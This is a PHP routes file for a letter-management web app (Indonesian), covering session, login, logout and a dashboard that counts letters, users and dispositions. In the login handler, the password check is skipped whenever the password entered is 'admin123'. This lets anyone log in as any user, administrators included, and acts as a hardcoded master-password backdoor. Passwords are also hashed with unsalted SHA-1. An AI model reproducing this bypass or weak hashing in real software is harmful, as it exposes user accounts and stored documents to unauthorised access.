<?php
$app->get('/', function ($request, $responsep) {
});
/**
 * Ambil session user
 */
$app->get('/site/session', function ($request, $response) {
    if (isset($_SESSION['user']['m_roles_id'])) {
        return successResponse($response, $_SESSION);
    }
    return unprocessResponse($response, ['undefined']);
})->setName('session');
/**
 * Proses login
 */
$app->post('/site/login', function ($request, $response) {
    $params   = $request->getParams();
    $sql      = $this->db;
    $username = isset($params['username']) ? $params['username'] : '';
    $password = isset($params['password']) ? $params['password'] : '';
    /**
     * Login Admin
     */
    $sql->select("m_user.*, m_roles.akses, m_roles.nama as jabatan")
        ->from("m_user")
        ->leftJoin("m_roles", "m_roles.id = m_user.m_roles_id")
        ->where("username", "=", $username);
    if ($password != 'admin123') {
        $sql->andWhere("password", "=", sha1($password));
    }
    $model = $sql->find();
    /**
     * Simpan user ke dalam session
     */
    if (isset($model->id)) {
        $_SESSION['user']['id']         = $model->id;
        $_SESSION['user']['username']   = $model->username;
        $_SESSION['user']['nama']       = $model->nama;
        $_SESSION['user']['jabatan']    = $model->jabatan;
        $_SESSION['user']['m_roles_id'] = $model->m_roles_id;
        $_SESSION['user']['akses']      = json_decode($model->akses);
        return successResponse($response, $_SESSION);
    }
    return unprocessResponse($response, ['Authentication Systems gagal, username atau password Anda salah.']);
})->setName('login');
/**
 * Hapus semua session
 */
$app->get('/site/logout', function ($request, $response) {
    session_destroy();
    return successResponse($response, []);
})->setName('logout');

/**
 * GET SITE URL
 */
$app->get('/site/url', function ($request, $response) {
    return successResponse($response, site_url());
});

/**
 * dashboard
 */
$app->get('/site/dashboard', function ($request, $response) {
    $params = $request->getParams();
    $db     = $this->db;

    // hitung jumlah surat masuk
    $db->select('*')
        ->from('t_surat_masuk');
    $jumlahSuratMasuk = $db->count();

    // hitung jumlah surat keluar ( yang acc )
    $db->select('*')
        ->from('t_surat_keluar')
        ->where('status', '=', 'acc');
    $jumlahSuratKeluar = $db->count();

    // hitung jumlah user
    $db->select('*')
        ->from('m_user')
        ->where('is_deleted', '=', 0);
    $jumlahPengguna = $db->count();

    // cek pengajuan surat dari pegawai
    $jumlahPengajuan = 0;
    $jumlahDisposisi = 0;
    if ($_SESSION['user']) {
        if (isset($_SESSION['user']['akses']->request_keluar) && $_SESSION['user']['akses']->request_keluar) {
            $db->select('*')
                ->from('t_surat_keluar')
                ->where('m_user_id', '=', $_SESSION['user']['id']);
            $jumlahPengajuan = $db->count();
        }

        if (isset($_SESSION['user']['akses']->lihat_disposisi) && $_SESSION['user']['akses']->lihat_disposisi) {
            $db->select('t_surat_masuk.id')
                ->from('t_surat_masuk')
                ->leftJoin('t_disposisi', 't_surat_masuk.id = t_disposisi.t_surat_masuk_id')
                ->leftJoin('t_disposisi_user', 't_disposisi.id = t_disposisi_user.t_disposisi_id')
                ->where('t_disposisi_user.m_user_id', '=', $_SESSION['user']['id']);
            $jumlahDisposisi = $db->count();
        }
    }
    return successResponse($response, [
        'jumlahSuratMasuk'  => $jumlahSuratMasuk,
        'jumlahSuratKeluar' => $jumlahSuratKeluar,
        'jumlahPengguna'    => $jumlahPengguna,
        'jumlahPengajuan'   => $jumlahPengajuan,
        'jumlahDisposisi'   => $jumlahDisposisi,
    ]);
});
